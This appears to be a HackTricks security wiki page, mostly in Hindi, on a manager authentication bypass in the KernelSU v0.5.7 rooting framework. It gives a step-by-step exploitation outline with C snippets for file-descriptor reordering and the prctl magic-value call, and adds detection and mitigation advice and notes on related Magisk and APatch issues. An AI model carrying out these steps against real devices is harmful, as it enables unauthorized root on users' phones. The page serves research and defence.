# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch और SKRoot जैसे Rooting frameworks Android/Linux kernel को patch या hook करते हैं और unprivileged userspace manager app के सामने privileged functionality उजागर करते हैं। Magisk पर नीचे अलग से चर्चा की गई है, क्योंकि CVE-2024-48336 में इस KernelSU syscall path के बजाय manager-side code loading शामिल था।<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

यह पेज public research में सामने आई techniques और pitfalls (विशेष रूप से Zimperium के KernelSU v0.5.7 analysis) को abstract करता है, ताकि red और blue teams attack surfaces, exploitation primitives और robust mitigations को समझ सकें।<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- KernelSU v0.5.7 में, `prctl` पर लगा kernel hook userspace से magic value, command ID और command-specific arguments प्राप्त करता है।<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller पहले `CMD_BECOME_MANAGER` के साथ manager status का अनुरोध करता है। Authorization command-specific है: `CMD_GRANT_ROOT` manager/allowlist state की जाँच करता है, `CMD_ALLOW_SU` केवल manager के लिए है, और इस version में `CMD_SET_SEPOLICY` केवल root के लिए है।<sup>[[2]](#references)[[11]](#references)</sup>
- अन्य commands version/configuration की जानकारी प्राप्त करते हैं या framework events report करते हैं।<sup>[[2]](#references)</sup>
- क्योंकि कोई भी app इस syscall interface को invoke कर सकता है, manager authentication की correctness critical है।<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler की ओर divert करने के लिए magic value: 0xDEADBEEF
- Commands में शामिल हैं: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, आदि।<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

जब userspace `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)` call करता है, तो KernelSU निम्नलिखित verify करता है:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- दिया गया path caller UID के लिए expected prefix से शुरू होना चाहिए, जैसे `/data/data/<pkg>` या `/data/user/<id>/<pkg>`।
- Reference: core_hook.c (v0.5.7) path prefix logic।<sup>[[2]](#references)</sup>

2) Ownership check
- Path का owner caller UID होना चाहिए।
- Reference: core_hook.c (v0.5.7) ownership logic।<sup>[[2]](#references)</sup>

3) FD table scan के माध्यम से APK signature check
- Calling process के open file descriptors को बढ़ते हुए descriptor order में iterate करें।
- प्रत्येक ऐसी regular file के लिए जिसका path `/data/app/` से शुरू होता है और `/base.apk` पर समाप्त होता है, यह आवश्यक है कि path में दिए गए data-directory path से प्राप्त package substring मौजूद हो।
- इन path checks को pass करने वाले पहले candidate की signature verify करें।
- APK v2 signature को parse करें और official manager certificate के विरुद्ध verify करें।
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification)।<sup>[[3]](#references)[[4]](#references)</sup>

यदि सभी checks pass हो जाते हैं, तो kernel manager के UID को अस्थायी रूप से cache करता है; इसके बाद manager-only commands उस UID को accept करते हैं, जबकि अन्य commands अपना UID या allowlist checks बनाए रखते हैं।<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 signature result को PackageManager की installed package identity से bind नहीं करता। `manager.c` में package test केवल path substring check (`strstr(cwd, pkg)`) है; इसके बाद इस test को pass करने वाले पहले candidate की signature check की जाती है। इसलिए attacker genuine manager APK को ऐसे `/data/app/` path के नीचे रख सकता है जिसमें attacker का package name भी हो और उसे पहले select करवाने की व्यवस्था कर सकता है।<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

यह trust-by-indirection किसी unprivileged app को manager की signing key own किए बिना manager का impersonation करने देता है।<sup>[[1]](#references)</sup>

Exploit की गई key properties:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan descriptor index के अनुसार ordered है और package check path substring test है, न कि verified package-to-APK identity binding।
- `open()` सबसे कम उपलब्ध FD return करता है। पहले lower-numbered FDs बंद करके attacker ordering को control कर सकता है।
- Bundled manager APK को `/data/app/` के नीचे ऐसे path पर रखा जा सकता है जिसमें attacker का package string हो, जबकि official manager signature बरकरार रहती है।

---
## Attack preconditions

Concrete KernelSU v0.5.7 case के लिए आवश्यक है:<sup>[[1]](#references)[[3]](#references)</sup>

- Device पहले से ही vulnerable Rooting framework (जैसे KernelSU v0.5.7) से rooted हो।
- Attacker locally arbitrary unprivileged code (Android app process) चला सके।
- v0.5.7 implementation के लिए `current->real_parent` का UID 0 होना आवश्यक है (source comment इसे zygote direct-child requirement के रूप में वर्णित करता है); `manager.c` अन्य parents को reject करता है।<sup>[[3]](#references)</sup>
- Real manager ने अभी तक authenticate न किया हो (जैसे reboot के तुरंत बाद)। कुछ frameworks success के बाद manager UID को cache करते हैं; आपको race जीतनी होगी।<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (d demo video public proof of concept को operation में दिखाता है):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Prefix और ownership checks को satisfy करने के लिए अपने app data directory का valid path बनाएं।
2) Genuine KernelSU Manager base.apk को `/data/app/` के नीचे ऐसे path पर रखें जिसमें आपका package string हो, फिर उसे अपने base.apk से lower-numbered FD पर open करें।
3) Checks pass करने के लिए `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` invoke करें।
4) Persistent su के लिए `CMD_GRANT_ROOT`, फिर `CMD_ALLOW_SU` का उपयोग करें; root प्राप्त करने के बाद और केवल supported स्थानों पर root-only `CMD_SET_SEPOLICY` invoke करें।

Step 2 (FD ordering) पर Practical notes:<sup>[[1]](#references)</sup>
- `/proc/self/fd` symlinks को walk करके अपने process के अपने `/data/app/*/base.apk` वाले FD की पहचान करें।
- कोई low FD (जैसे stdin, fd 0) बंद करें और legitimate manager APK को पहले open करें, ताकि वह fd 0 (या आपके base.apk fd से lower किसी index) पर occupy हो।
- Legitimate manager APK को अपने app के साथ bundle करें, ताकि उसका path `/data/app/` से शुरू हो, `/base.apk` पर समाप्त हो और उसमें आपका package string मौजूद हो। उदाहरण के लिए, आपके app की `lib` directory के नीचे का path इन checks को satisfy कर सकता है।<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Open FDs enumerate करके base.apk entries locate करें:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
कम संख्या वाले FD को legitimate manager APK की ओर point करने के लिए बाध्य करें:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
KernelSU v0.5.7 `prctl` hook के माध्यम से Manager authentication:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
सफलता के बाद, विशेषाधिकारयुक्त commands (उदाहरण):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: वर्तमान process को root में promote करें
- CMD_ALLOW_SU: persistent su के लिए अपने package/UID को allowlist में जोड़ें
- CMD_SET_SEPOLICY: root प्राप्त करने के बाद SELinux policy को adjust करें; KernelSU v0.5.7 इस command के लिए UID 0 की जांच करता है।<sup>[[2]](#references)</sup>

Race/persistence tip:
- AndroidManifest में एक BOOT_COMPLETED receiver (`RECEIVE_BOOT_COMPLETED`) register करें, ताकि reboot के बाद start होकर real manager से पहले authentication का प्रयास कर सके; यह permission `ACTION_BOOT_COMPLETED` प्राप्त करने की अनुमति देती है, लेकिन स्वयं scheduling priority की guarantee नहीं देती।<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection और mitigation guidance

Framework developers के लिए:
- Authentication को arbitrary FDs से नहीं, बल्कि caller के package/UID से bind करें:
- उसके UID से caller का package resolve करें और FDs को scan करने के बजाय PackageManager के माध्यम से installed package के signature से verify करें।
- यदि kernel-only हो, तो stable caller identity (task creds) का उपयोग करें और process FDs के बजाय init/userspace helper द्वारा managed stable source of truth पर validate करें।
- Identity के रूप में path-prefix checks से बचें; caller इन्हें आसानी से satisfy कर सकता है।
- Channel पर nonce-based challenge–response का उपयोग करें और boot या key events पर किसी भी cached manager identity को clear करें।
- जहां संभव हो, generic syscalls को overload करने के बजाय binder-based authenticated IPC पर विचार करें।

Defenders/blue team के लिए:
- Rooting frameworks और manager processes की presence detect करें; यदि आपके पास kernel telemetry है, तो suspicious magic constants (जैसे 0xDEADBEEF) वाले prctl calls को monitor करें।<sup>[[1]](#references)[[11]](#references)</sup>
- Managed fleets में untrusted packages के उन boot receivers को block या alert करें, जो boot के तुरंत बाद privileged manager commands का तेजी से प्रयास करते हैं।
- सुनिश्चित करें कि devices patched framework versions पर updated हों; update के समय cached manager IDs को invalidate करें।

Attack की limitations:<sup>[[1]](#references)[[2]](#references)</sup>
- यह केवल उन devices को प्रभावित करता है जो पहले से ही vulnerable framework के साथ rooted हैं।
- आम तौर पर legitimate manager के authenticate होने से पहले reboot/race window की आवश्यकता होती है (कुछ frameworks reset होने तक manager UID को cache करते हैं)।

---
## Frameworks के बीच संबंधित notes

- Password-based auth (जैसे, historical APatch/SKRoot builds) कमजोर हो सकता है, यदि passwords guessable/bruteforceable हों या validations में bugs हों।<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (जैसे, KernelSU) सिद्धांत रूप से अधिक मजबूत है, लेकिन इसे path-derived artefacts से नहीं, actual caller से bind करना आवश्यक है, जिन्हें FD scans के माध्यम से select किया जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 ने pre-Canary 27007 builds को प्रभावित किया, जो एक unverified GMS package से code load करते थे; इससे local app को Magisk app में code execute करने और user interaction के बिना root तक escalate करने की अनुमति मिलती थी।<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – All Evil की Rooting: वे Security Holes जो आपके Mobile Device को Compromise कर सकते हैं](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c authentication checks](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c FD iteration, package check और signature call](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c APK v2 verification](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – Verify GMS is system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h command identifiers](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
